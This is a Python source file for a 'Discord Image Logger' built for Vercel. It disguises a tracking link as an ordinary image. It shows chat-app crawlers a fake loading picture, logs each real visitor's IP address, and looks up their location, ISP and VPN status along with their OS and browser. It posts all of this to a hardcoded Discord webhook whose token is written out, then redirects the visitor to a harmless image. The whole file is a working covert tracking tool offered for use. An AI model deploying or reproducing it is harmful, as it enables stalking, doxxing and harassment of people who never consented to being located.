# ==========================================
# Holy System - Discord Image Logger
# Optimized for Vercel Deployment
# ==========================================

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback
import requests
import base64
import httpagentparser

# Configuration Dictionary
config = {
    # Replace with your actual Discord Webhook URL
    "webhook": "https://discord.com/api/webhooks/1457320227212886170/1gwlEi-KBGixKbJZenFYUqD98j_tNENmZY2rS6kxWHQ2ExlgIC3UK7_OW2XVD8eHDVR6",
    
    # Default image to display
    "image": "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg",
    
    # Customization
    "username": "Holy Image Logger",
    "color": 0x00FFFF, # Cyan Hex
    
    # Options
    "buggedImage": True, # Shows a loading fake image to Discord bots
    "linkAlerts": True,  # Notify when the link is just sent in chat
}

# Binary for the fake "loading" image shown to Discord
LOADING_IMAGE = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def check_if_bot(ip, ua):
    """Checks if the request is coming from a Discord or Telegram crawler."""
    if ip and (ip.startswith("34.") or ip.startswith("35.")):
        return "Discord"
    if ua and "TelegramBot" in ua:
        return "Telegram"
    if ua and "Discordbot" in ua:
        return "Discord"
    return False

def post_to_webhook(ip, ua, endpoint="N/A", is_bot=False):
    """Fetches IP info and sends a formatted embed to Discord."""
    try:
        # Fetch geolocation data
        api_url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,proxy,hosting"
        info = requests.get(api_url, timeout=5).json()
        
        # Detect OS and Browser
        os, browser = httpagentparser.simple_detect(ua)
        
        # Determine color and title based on bot status
        color = config["color"] if not is_bot else 0x7289da
        title = "📸 User Logged" if not is_bot else "🤖 Link Preview/Bot Detected"
        
        payload = {
            "username": config["username"],
            "embeds": [{
                "title": title,
                "color": color,
                "description": f"**IP Address:** `{ip}`\n**Location:** `{info.get('country')}, {info.get('city')}`\n**ISP:** `{info.get('isp')}`\n**VPN/Proxy:** `{info.get('proxy')}`\n**OS:** `{os}`\n**Browser:** `{browser}`\n**Endpoint:** `{endpoint}`",
                "footer": {"text": f"User Agent: {ua}"}
            }]
        }
        
        requests.post(config["webhook"], json=payload)
    except Exception:
        print(traceback.format_exc())

class handler(BaseHTTPRequestHandler):
    """Vercel requires the class to be named 'handler'."""
    
    def do_GET(self):
        try:
            # Get real IP from Vercel headers
            ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
            ua = self.headers.get('user-agent', 'Unknown')
            path = self.path
            
            # Check if it's a bot (Discord/Telegram)
            bot_type = check_if_bot(ip, ua)
            
            if bot_type:
                # 1. Handle Bot Request (Preview)
                # We send the loading image to trick Discord into showing a preview
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(LOADING_IMAGE)
                
                if config["linkAlerts"]:
                    post_to_webhook(ip, ua, endpoint=path, is_bot=True)
                return

            else:
                # 2. Handle Real User Request
                # Log the data first
                post_to_webhook(ip, ua, endpoint=path, is_bot=False)
                
                # Redirect user to the actual image
                self.send_response(302)
                self.send_header('Location', config["image"])
                self.end_headers()
                
        except Exception:
            # Handle server errors
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Internal Server Error")
            print(traceback.format_exc())

# Required for Vercel
app = handler
